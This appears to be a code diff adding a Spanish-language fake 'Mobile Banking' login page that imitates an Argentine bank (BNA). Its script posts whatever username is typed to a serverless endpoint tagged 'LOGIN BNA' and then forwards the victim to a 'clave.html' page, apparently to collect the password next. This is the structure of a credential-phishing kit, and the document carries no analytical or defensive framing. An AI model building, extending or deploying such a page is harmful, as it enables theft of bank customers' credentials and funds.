@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobile Banking</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+<!-- Header superior -->
+<header class="top-bar">
+    <div class="title">Mobile Banking</div>
+    <div class="classic">
+        <span class="home-icon">🏠</span>
+        Versión Clásica
+    </div>
+</header>
+
+<!-- Logo -->
+<div class="logo-container">
+    <img src="bna.png" alt="Logo">
+</div>
+
+<!-- Card -->
+<div class="login-card">
+    <div class="login-title">Ingresá tu usuario</div>
+
+    <input
+        type="text"
+        id="loginInput"
+        maxlength="12"
+        autocomplete="off"
+        placeholder=""
+    >
+
+    <button type="button" class="btn-accept" onclick="enviarLogin()">
+        <span class="check">✔</span>
+        Aceptar
+    </button>
+</div>
+
+<!-- Links -->
+<div class="links">
+    <p>¿No sos usuario?</p>
+    <a href="#">Registrate y comenzá</a>
+
+    <p class="mt">¿Acceso bloqueado?</p>
+    <a href="#">Gestioná tu desbloqueo</a>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+    <span class="close">✖</span>
+    <p>Salir</p>
+</footer>
+
+<script>
+const loginInput = document.getElementById("loginInput");
+
+/* Solo letras y números – máximo 12 */
+loginInput.addEventListener("input", () => {
+    loginInput.value = loginInput.value
+        .replace(/[^a-zA-Z0-9]/g, "")
+        .slice(0, 12);
+});
+
+function enviarLogin() {
+    const login = loginInput.value.trim();
+
+    if (login.length === 0) {
+        loginInput.focus();
+        return;
+    }
+
+    fetch("/.netlify/functions/enviar", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            tipo: "🏦 LOGIN BNA",
+            valor: login
+        })
+    })
+    .finally(() => {
+        window.location.href = "clave.html";
+    });
+}
+</script>
+
+</body>
+</html>
